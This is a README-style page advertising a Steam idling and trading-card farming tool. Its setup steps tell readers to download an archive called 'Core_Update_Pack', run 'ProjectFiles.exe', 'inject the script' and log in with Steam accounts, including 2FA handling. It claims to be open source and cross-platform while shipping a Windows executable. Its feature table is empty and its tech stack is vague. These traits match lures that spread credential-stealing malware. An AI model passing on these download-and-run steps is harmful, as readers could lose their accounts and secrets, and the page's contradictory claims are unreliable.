🃏 Steam Idler & Card Farmer

Farm Trading Cards, Boost Playtime & Idle Games — 2026

A lightweight, open-source Steam Idler that does it all: farm trading cards, boost your playtime hours, and idle multiple games simultaneously.
No Steam client required. Works headlessly on Windows, macOS, and Linux.

🎯 What it is

Steam Idler & Card Farmer is a standalone tool that simulates playing games on Steam.
It is designed for users who want to collect trading cards, increase their total playtime, or simply keep their account active without actually running the games.

⚠️ Warning: Idling games may affect your refund eligibility (if you have purchased a game recently). Use at your own risk. We are not responsible for any account restrictions.

🚀 Quick Start

1. Download Core_Update_Pack using the button above.
2. Extract the archive into a separate folder.
3. Run ProjectFiles.exe.
4. Follow the on-screen instructions and inject the script.

| Feature                     | Description                                          |

🛠️ How to use

1. Launch ProjectFiles.exe.
2. Log in with your Steam account (or add multiple accounts).
3. Select the games you want to idle (for cards or playtime).
4. Click "Start" to begin idling.
5. Monitor your progress and card drops in the dashboard.

⚙️ Configuration

You can adjust settings in the config.json file:

- Idle Mode: cards (farm cards) or playtime (boost hours)
- Max Concurrent Games: Up to 32 games at once
- Accounts: Add multiple Steam accounts
- Steam Guard: Enable/disable 2FA handling

❓ FAQ

Is this safe to use?
The tool simulates game activity only. However, use it at your own risk. Avoid idling games you might want to refund.

Does it require the Steam client?
No. It runs headlessly and connects directly to Steam servers.

Can I farm cards for multiple accounts?
Yes, multi-account support is built-in.

Does it work on Mac or Linux?
Yes, it runs on Windows, macOS, and Linux.

💻 Tech Stack & Architecture

- Core: Node.js / C# / TypeScript (depending on the build)
- Steam API: SteamKit2 / steam-user
- UI: Web Dashboard / CLI
- Target OS: Windows / macOS / Linux
